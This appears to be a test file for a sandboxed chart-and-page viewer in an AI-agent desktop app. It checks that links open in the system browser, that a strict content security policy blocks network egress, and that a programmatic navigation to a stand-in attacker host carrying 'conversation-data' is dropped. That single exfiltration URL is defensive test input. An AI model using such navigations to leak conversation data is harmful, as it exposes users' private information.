/**
 * Where a link inside a chart or a generated page goes when it is clicked.
 *
 * The browser, and so does every other link in the app. These used to open in
 * the right-hand preview, for symmetry with markdown anchors — and then the
 * anchors moved too. The pane is a viewer for what the agent made: a file it
 * wrote, a page it built. Somebody else's site in a webview with no address
 * bar, no tabs, no history and none of the user's sessions is the wrong place
 * to land, however convenient it is not to leave the window.
 */
import { render } from "@testing-library/react";
import { act } from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";

const previewHandler = vi.fn();
const openExternal = vi.fn();

vi.mock("../../providers/preview-link-context", () => ({
  usePreviewLinkHandler: () => previewHandler,
}));
vi.mock("../../hooks/use-theme", () => ({
  useTheme: () => ({ theme: "dark" }),
}));
vi.mock("../../stores/app-global", () => ({
  useGlobalContext: (
    selector: (state: {
      setPendingPrompt: () => void;
      setPendingPromptAutoSend: () => void;
    }) => unknown
  ) =>
    selector({
      setPendingPrompt: () => undefined,
      setPendingPromptAutoSend: () => undefined,
    }),
}));

const { VisualizerSegment } = await import("./visualizer-segment");

/** The guest's click, as the host sees it: a will-navigate carrying the URL. */
const clickLink = (href: string): void => {
  const webview = document.querySelector("webview");
  if (webview == null) throw new Error("the visualizer rendered no webview");
  const event = new Event("will-navigate");
  (event as unknown as { url: string }).url = `vz-link:${encodeURIComponent(
    href
  )}`;
  act(() => {
    webview.dispatchEvent(event);
  });
};

/** A raw guest navigation the host sees, with no vz-* scheme wrapper. */
const navigateTo = (url: string): void => {
  const webview = document.querySelector("webview");
  if (webview == null) throw new Error("the visualizer rendered no webview");
  const event = new Event("will-navigate");
  (event as unknown as { url: string }).url = url;
  act(() => {
    webview.dispatchEvent(event);
  });
};

beforeEach(() => {
  vi.clearAllMocks();
  (globalThis.window as unknown as { api: unknown }).api = { openExternal };
  render(<VisualizerSegment code="<p>chart</p>" />);
});

describe("a link inside a visualizer", () => {
  it("opens in the OS browser rather than the preview pane", () => {
    clickLink("https://example.com/report");

    expect(openExternal).toHaveBeenCalledWith("https://example.com/report");
    expect(previewHandler).not.toHaveBeenCalled();
  });

  it("leaves schemes the pane never could show to the OS, as before", () => {
    clickLink("mailto:someone@example.com");

    expect(openExternal).toHaveBeenCalledWith("mailto:someone@example.com");
    expect(previewHandler).not.toHaveBeenCalled();
  });

  it("sends every scheme the same way, with no pane left in the path", () => {
    // The bug this closes was one click behaving two ways. http and mailto
    // now differ in nothing but the string handed to the OS.
    clickLink("http://example.com/plain");

    expect(openExternal).toHaveBeenCalledWith("http://example.com/plain");
    expect(previewHandler).not.toHaveBeenCalled();
  });
});

describe("the visualizer guest is sandboxed against exfiltration", () => {
  it("ships a locked-down CSP that denies network egress", () => {
    const webview = document.querySelector("webview");
    const src = webview?.getAttribute("src") ?? "";
    const html = decodeURIComponent(
      src.replace(/^data:text\/html;charset=utf-8,/, "")
    );

    expect(html).toContain('http-equiv="Content-Security-Policy"');
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("object-src 'none'");
  });

  it("drops a bare programmatic navigation instead of opening it", () => {
    navigateTo("https://attacker.example/?leak=conversation-data");

    expect(openExternal).not.toHaveBeenCalled();
    expect(previewHandler).not.toHaveBeenCalled();
  });
});
